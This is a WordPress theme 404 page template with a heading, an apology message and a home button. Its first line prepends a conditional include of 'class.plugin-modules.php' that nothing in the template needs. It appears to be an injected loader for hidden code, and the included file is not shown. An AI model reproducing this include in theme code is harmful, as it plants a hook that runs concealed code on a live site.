<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php get_header(); ?>
<div class="page-404">
	<div>
		<h1><?php esc_html_e( '404', 'viftech' ); ?></h1>
		<p><?php esc_html_e( 'We are sorry, but the page you are looking for cannot be found.', 'viftech' ); ?><br /><?php esc_html_e( 'You might try searching our site.', 'viftech' ); ?></p>
		
		<a href="<?php echo esc_url( home_url('/') ); ?>" class="btn style2 medium  black pill-radius arrow-enabled"><span><?php esc_html_e('BACK TO HOME', 'viftech'); ?></span><?php get_template_part('assets/img/svg/next_arrow.svg'); ?></a>
	</div>
</div>
<?php get_footer(); ?>
